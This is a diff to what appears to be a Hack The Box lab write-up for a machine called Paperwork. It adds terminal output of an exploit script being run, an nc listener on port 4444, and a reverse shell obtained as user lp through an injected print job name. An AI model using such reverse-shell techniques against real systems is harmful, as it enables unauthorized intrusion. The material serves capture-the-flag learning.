@@ -519,8 +519,10 @@ if __name__ == "__main__":
 
 **Result:**
 
-```
-
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
+└─$ python3 foothold.py 
+[+] Exploit sent. Check your listener!
 ```
 
 **Command (attacker, terminal 2):** `nc -lvnp 4444`
@@ -533,8 +535,14 @@ if __name__ == "__main__":
 
 **Result:**
 
-```
-
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Paperwork]
+└─$ nc -lvnp 4444                   
+listening on [any] 4444 ...
+connect to [10.10.15.111] from (UNKNOWN) [10.129.35.97] 36114
+bash: cannot set terminal process group (983): Inappropriate ioctl for device
+bash: no job control in this shell
+lp@paperwork:/opt/LPDServer$ 
 ```
 
 **Payload (the injected `job_name`):**
